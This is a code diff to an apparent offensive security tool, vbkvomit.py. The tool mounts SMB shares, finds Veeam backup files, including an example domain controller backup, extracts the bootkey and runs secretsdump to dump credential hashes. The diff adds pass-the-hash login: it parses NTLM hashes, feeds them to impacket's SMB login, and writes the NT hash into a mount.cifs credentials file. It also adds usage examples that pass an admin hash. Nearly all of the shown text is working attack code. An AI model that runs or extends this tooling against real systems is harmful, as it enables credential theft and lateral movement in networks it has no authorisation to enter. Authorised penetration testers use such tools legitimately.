@@ -10,6 +10,7 @@ bootkey, and runs impacket secretsdump.py.
 Examples:
   SMB null auth:       vbkvomit.py -t 192.168.15.151
   SMB authenticated:   vbkvomit.py -t 10.10.10.5 -u admin -p s3cr3t -d corp
+  SMB pass-the-hash:   vbkvomit.py -t 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -d corp
   SMB specific path:   vbkvomit.py -t 192.168.15.151 --path "lab/VeeamBackups"
   Local mounted share: vbkvomit.py --local-path /mnt/backups
 """
@@ -2144,11 +2145,20 @@ def _decode_smb(val):
         return ""
     return str(val).replace("\x00", "").strip()
 
-def list_smb_shares(host, user, password, domain):
+def _parse_hash(h):
+    """Parse impacket-style [LMHASH:]NTHASH; returns (lmhash, nthash)."""
+    if ':' in h:
+        lm, nt = h.split(':', 1)
+    else:
+        lm, nt = '', h
+    return lm, nt
+
+
+def list_smb_shares(host, user, password, domain, lmhash='', nthash=''):
     try: from impacket.smbconnection import SMBConnection
     except ImportError: die("impacket not found: pip install impacket")
     conn = SMBConnection(host, host, sess_port=445)
-    conn.login(user, password, domain)
+    conn.login(user, password, domain, lmhash=lmhash, nthash=nthash)
     result = []
     for s in conn.listShares():
         try: name = _decode_smb(s["shi1_netname"])
@@ -2175,17 +2185,21 @@ def select_shares(shares):
         except: pass
         print("[!] Invalid")
 
-def create_cifs_creds(domain, user, password):
+def create_cifs_creds(domain, user, password, nthash=''):
     fd, path = tempfile.mkstemp(prefix="vbkvomit_", suffix=".creds")
     os.close(fd)
     with open(path, "w") as f:
         if domain:   f.write(f"domain={domain}\n")
         if user:     f.write(f"username={user}\n")
-        if password: f.write(f"password={password}\n")
+        if nthash:
+            # mount.cifs PtH: colon-prefixed NT hash with sec=ntlmssp
+            f.write(f"password=:{nthash}\n")
+        elif password:
+            f.write(f"password={password}\n")
     os.chmod(path, 0o600)
-    return path
+    return path, bool(nthash)
 
-def mount_cifs(host, share, creds_file):
+def mount_cifs(host, share, creds_file, use_pth=False):
     pre = _sudo()
     mnt = Path("/mnt") / share
     subprocess.run([*pre, "mkdir", "-p", str(mnt)], capture_output=True)
@@ -2197,8 +2211,9 @@ def mount_cifs(host, share, creds_file):
     sz = Path(creds_file).stat().st_size if creds_file and Path(creds_file).exists() else 0
     # uid/gid so the mounted files are owned by the invoking user (mount runs
     # as root via sudo, but the tool itself stays unprivileged).
+    sec = "ntlmssp" if use_pth else "ntlmsspi"
     fast = (f"vers=3.1.1,rsize=4194304,wsize=4194304,cache=loose,iocharset=utf8,"
-            f"ro,uid={os.getuid()},gid={os.getgid()}")
+            f"ro,uid={os.getuid()},gid={os.getgid()},sec={sec}")
     opts = (f"credentials={creds_file},{fast}" if sz else f"guest,{fast}")
     r = subprocess.run([*pre, "mount", "-t", "cifs", f"//{host}/{share}", str(mnt),
                         "-o", opts], capture_output=True)
@@ -2350,17 +2365,25 @@ def check_deps():
 def run_smb(args, sd_path, out_dir):
     host = args.target
     user = args.username or ""; pw = args.password or ""; dom = args.domain or ""
-    if user and not pw: pw = getpass.getpass("[?] Password: ")
+    lmhash = nthash = ""
+    if args.hashes:
+        lmhash, nthash = _parse_hash(args.hashes)
+        if user and not pw and not nthash:
+            pw = getpass.getpass("[?] Password: ")
+    elif user and not pw:
+        pw = getpass.getpass("[?] Password: ")
     auth = f"{dom}\\{user}" if dom else (user or "null auth")
+    if nthash:
+        auth += f" [PtH]"
     print(f"[*] Connecting to {host} as {auth}...")
-    shares = list_smb_shares(host, user, pw, dom)
+    shares = list_smb_shares(host, user, pw, dom, lmhash=lmhash, nthash=nthash)
     if not shares: die("No accessible shares")
     selected = select_shares(shares)
-    creds = create_cifs_creds(dom, user, pw)
+    creds, use_pth = create_cifs_creds(dom, user, pw, nthash=nthash)
     mounted = []
     try:
         for sh in selected:
-            m = mount_cifs(host, sh, creds)
+            m = mount_cifs(host, sh, creds, use_pth=use_pth)
             if m: mounted.append(m)
         if not mounted: die("No shares mounted")
         scan_paths = mounted
@@ -2418,6 +2441,7 @@ def main():
 Examples:
   SMB null auth:     %(prog)s -t 192.168.15.151
   SMB authenticated: %(prog)s -t 10.10.10.5 -u admin -p s3cr3t -d corp
+  SMB pass-the-hash: %(prog)s -t 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -d corp
   SMB specific path: %(prog)s -t 192.168.15.151 --path "lab/VeeamBackups"
   Local directory:   %(prog)s --local-path /mnt/backups
   Single VBK file:   %(prog)s --local-path /tmp/dc_backup.vbk
@@ -2432,6 +2456,8 @@ Examples:
                       help="Local directory or VBK file path(s)")
     p.add_argument("-u", "--username", default="")
     p.add_argument("-p", "--password", default="")
+    p.add_argument("-H", "--hashes", default="", metavar="[LMHASH:]NTHASH",
+                   help="NTLM hash for pass-the-hash authentication (impacket format)")
     p.add_argument("-d", "--domain", default="")
     p.add_argument("--path", default="",
                    help="Path within the SMB share (e.g. lab/VeeamBackups)")
